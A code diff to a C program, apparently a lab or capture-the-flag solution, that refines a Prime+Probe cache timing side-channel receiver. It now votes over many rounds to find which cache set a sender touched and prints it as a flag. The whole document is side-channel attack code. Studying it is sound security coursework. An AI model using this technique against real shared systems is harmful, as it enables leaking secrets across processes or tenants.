@@ -2,12 +2,11 @@
 #include <sys/mman.h>
 #include <stdint.h>
 #include <stdio.h>
-#include <stdlib.h>
 
-#define BUFF_SIZE (128*1024*1024) // 128MB buffer
-#define CACHE_LINE 64
+#define BUFF_SIZE (2*1024*1024)
 #define NUM_SETS 1024
-#define NUM_PROBES 10           // number of times to measure
+#define STRIDE 65536
+#define ROUNDS 500
 
 int main(int argc, char const *argv[]) {
 
@@ -27,34 +26,53 @@ int main(int argc, char const *argv[]) {
     buf[0] = 1;
 
     char *set_addr[NUM_SETS];
-    uint64_t times[NUM_SETS];
+    uint64_t scores[NUM_SETS] = {0};
 
     for (int i = 0; i < NUM_SETS; i++) {
-        set_addr[i] = buf + i * 65536;  // spacing addresses for cache sets
+        set_addr[i] = buf + i * STRIDE;
     }
 
-    uint64_t max_time = 0;
+    for (int round = 0; round < ROUNDS; round++) {
 
-    for (int probe = 0; probe < NUM_PROBES; probe++) {
-
-        // PRIME: touch all addresses to fill cache
-        for (int i = 0; i < NUM_SETS; i++)
+        // PRIME
+        for (int i = 0; i < NUM_SETS; i++) {
             *(volatile char*)set_addr[i];
+        }
 
-        // Small delay
+        // small delay
         for (volatile int i = 0; i < 100000; i++);
 
-        // PROBE: measure access times
+        // PROBE
+        uint64_t max_time = 0;
+        int candidate = -1;
+
         for (int i = 0; i < NUM_SETS; i++) {
+
             uint64_t t = measure_one_block_access_time((ADDR_PTR)set_addr[i]);
-            times[i] = t;  // optional: store all for debugging
 
             if (t > max_time) {
                 max_time = t;
-                flag = i;
+                candidate = i;
             }
         }
+
+        if (candidate >= 0) {
+            scores[candidate]++;
+        }
     }
+
+    // find most frequent candidate
+    int best_set = 0;
+    uint64_t best_score = 0;
+
+    for (int i = 0; i < NUM_SETS; i++) {
+        if (scores[i] > best_score) {
+            best_score = scores[i];
+            best_set = i;
+        }
+    }
+
+    flag = best_set;
 
     printf("Flag: %d\n", flag);
 
